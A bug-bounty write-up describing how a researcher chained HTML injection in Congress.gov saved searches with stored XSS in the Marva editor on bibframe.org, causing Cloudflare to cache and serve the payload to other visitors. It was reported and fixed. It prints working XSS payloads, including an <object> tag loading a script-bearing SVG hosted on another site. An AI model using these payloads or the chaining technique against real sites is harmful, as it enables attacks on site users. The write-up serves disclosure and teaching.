In September 2024, I accidentally poisoned the Library of Congress.

Well, to be more exact, I poisoned the cache on Congress.gov using self-XSS.

Self-XSS isn't usually something to get excited about. If you have to manually enter a cross-site scripting payload into your own account to make it execute, you haven't accomplished much.

Except, as it turned out, this XSS wasn't quite as *self*-contained as I'd thought.

## Breaking an image

I found Congress.gov through the [Library of Congress’s vulnerability disclosure program](https://www.loc.gov/legal/security-copyright-and-privacy/vulnerability-disclosure-program/). 

Its homepage had a large search bar for congressional records. I tried searching for “cybersecurity” and got back a list of cybersecurity bills.

I tried some SQL injection payloads in the search field, without success. I spent a while testing other parts of the site, then came back to the search bar and tried cross-site scripting (XSS):

```html
<img src=x onerror="alert(1)">
```

The WAF returned a page saying, “Sorry, you have been blocked.”

I removed the event handler, which is a common string that WAFs block on, and tried a plain image tag:

```html
<img src=x>
```

If the search results rendered it as HTML, I expected the browser to show a broken image icon, since `src=x` was an invalid source.

No such luck. The text was displayed safely in the page, properly escaped.

I started clicking around the results page and noticed a "Save this Search" button. It required an account, so I created one to see what else I could mess with.

After signing in, the "Save this Search" form asked for a title and description. I entered `<img src=x>` in both fields and saved the search.

When the results page reloaded, it showed the title of the search I just saved. Instead of the text `<img src=x>`, there was a broken image icon. 

![Broken image](../../images/003_broken-image.png)

Finally, my input had been rendered as HTML.

There was a button called “Your Saved Searches” that loaded a saved-searches page. I clicked it, and the broken image appeared on that page too.

I hadn’t made any JavaScript run, and the search was saved to my own account. I couldn’t see a way to make the title appear in someone else’s account without asking them to enter it themselves.

Great. Another dead end.

I decided to keep trying for JavaScript execution anyway. Using [PortSwigger’s XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), I went through dozens of tags and event handlers. I even tried SVG payloads such as:

```html
<svg xmlns="http://www.w3.org/2000/svg">
  <a href="javascript:alert(1)">
    <text x="10" y="20">Click me</text>
  </a>
</svg>
```

Some were blocked by the WAF, and others just didn’t execute at all. Eventually, I left Congress.gov alone and moved on to another domain in the program.

## A more successful dead end

On `bibframe.org`, which is another domain managed by the Library of Congress, I found an application called [Marva](https://bibframe.org/marva/quartz/). [Marva's GitHub page](https://github.com/lcnetdev/marva-quartz) describes it as a "Bibframe RDF XML editor".

After opening the website for the first time, it assigned me a randomly generated guest username, which I later found out would be saved along with any XML documents I created on the site. Clicking on the username let me change it.

I entered:

```html
<img src=x onerror="alert('XSS Demonstration')" />
```

I saved the username, expecting to see a WAF block page. No block came. But the payload was displayed as raw text where the guest username used to be, not rendered as HTML. No XSS here.

Clicking through the application more, I found I could create blank records, one of which was called a Monograph record. 
![Blank records](../../images/003_blank_records.png)

So I created a blank Monograph record, added some random text, and clicked Save on the form.

An alert appeared in my browser with the message **“XSS Demonstration.”**
![Blank records](../../images/003_js_popup.png)

Just like that, the code in my username was executed. I had XSS on Marva.

When I saved the record, it was assigned a unique ID: e2350366. In the network traffic, I found that it had been saved at:

```text
https://bibframe.org/marva/api-production/ldp/e2350366
```

Navigating directly to that URL triggered the XSS alert too. The application had stored my username with the record and was rendering it without neutralizing the HTML. And because it was saved persistently to the server, it was stored XSS. Unlike the Congress.gov finding, though, this payload was accessible through a public URL.

I finally had XSS. But it was on Marva, a little-known application with very few users, and as far as I could tell, the website didn't process or store any sensitive information.

So then, what was the real impact? I didn't see much at all.

I made a note of the finding and went back to Congress.gov.

## Two wrongs make an XSS

On Congress.gov, I couldn't get JavaScript past the WAF, but I could still inject HTML. What if I didn't need to put the JavaScript directly in the saved-search title?

I remembered that an `<object>` element can load an external resource:

```html
<object data="https://example.com/xss.svg"></object>
```

That tag would load an external SVG onto the page. If the SVG contained JavaScript, it might just execute. So now I just needed somewhere to host an external SVG.

Well, I'd just found a website that would let me store an SVG and access it through a public URL. Maybe that Marva finding wasn't so useless after all.

I returned to bibframe.org, changed my username to the following SVG, and saved a new record which returned the ID e0665460:

```html
<svg xmlns="http://www.w3.org/2000/svg"><script>alert('XSS Demonstration')</script></svg>
```

The new record triggered the alert when I opened its URL.

I copied that URL, went back to Congress.gov, and used the URL in the title of another saved search:

```html
<object data="https://bibframe.org/marva/api-production/ldp/e0665460"></object>
```

The title went through and the search was saved. When I opened “Your Saved Searches,” the browser fetched the Marva record containing my SVG and executed the JS, which gave me a satisfying popup:
**"XSS Demonstration"**

Finally, after all that time and effort, I had... just another form of self-XSS.

Uh, great. What exactly was I supposed to do with this?

The impact, as far as I could tell, was practically nonexistent. So I wrote down the findings and moved on.

## Oops

I still had the saved-searches page open. I wondered whether the site would let me access it without signing in, so I opened a private window and navigated to:

```text
https://www.congress.gov/saved-searches
```

I waited for the page to load. Then, I got a popup:
**"XSS Demonstration"**

I was signed into Congress.gov in my regular browser window, but the private window shouldn’t have had that session. 

Okay, that couldn't be right. Maybe I was still logged in somehow.

I signed out of my account in the regular browser window, opened another private window, and tried again.

The alert appeared again.

I pulled out my phone and opened the same page.

Same alert.

Maybe it had something to do with my IP address? My phone was connected to the same Wi-Fi network, after all.

I connected through a VPN server in another country and loaded the page again.

The popup was still there.

Oh. Oh no.

Just to be sure, I created an entirely new Congress.gov account through the VPN and opened its saved searches.

**"XSS Demonstration"**

Okay. So whatever was happening, it clearly wasn't limited to my account anymore.

This was the day I learned about cache poisoning.

## Following the evidence

After a bit of research, I decided to check the headers. The response headers included:

```text
server: cloudflare
cache-control: public, max-age=1800
cf-cache-status: HIT
```

The `public` directive meant that the page was configured for shared caching, and `max-age=1800` specified a cache lifetime of 30 minutes. `cf-cache-status: HIT` showed that Cloudflare had served the response from its cache.

With this information, the following timeline of events seemed likely:
1. The cached version of `/saved-searches` expired.
2. I happened to open the page after saving a search containing my XSS payload.
3. Since Cloudflare didn't have a fresh response in its cache, it fetched the page from Congress.gov.
4. Congress.gov returned the saved-searches page for *my* account, including the unsanitized XSS payload.
5. Instead of treating that response as account-specific, Cloudflare cached it as a public page.
6. Anyone who was served that cached response would now see my saved searches, complete with the XSS payload. And with a cache lifetime of 30 minutes, that could continue happening until the cached response expired or was replaced.

I thought about trying to escalate this vulnerability to show more impact. After all, since the script came from an SVG on `bibframe.org`, the script ran under that origin and couldn’t directly access the Congress.gov page’s DOM or cookies.

But the alert was already appearing outside my account, surprising users with an **"XSS Demonstration"** jumpscare. I decided reporting now would be the most responsible thing to do.

## The aftermath

I reported the Congress.gov caching issue and the Marva XSS to the Library of Congress on September 6, 2024. The same day, they responded to say that they were investigating. On October 1, they confirmed that the vulnerabilities had been fixed.

Afterwards, the saved-searches page returned:

```text
cache-control: no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0
cf-cache-status: DYNAMIC
```

Fix confirmed. Cloudflare was no longer caching the page. 

Congress.gov was also updated so that HTML entered into saved searches was neutralized. On bibframe.org, Marva was locked down to prevent users from entering a custom username.

And with that, the report was closed.

I'd started with an HTML injection that seemed useless, found a stored XSS on an unrelated application that seemed equally useless, and ended up with a script being served to other people's accounts.

I certainly hadn't set out to poison a cache that day. I didn't even know what cache poisoning was.
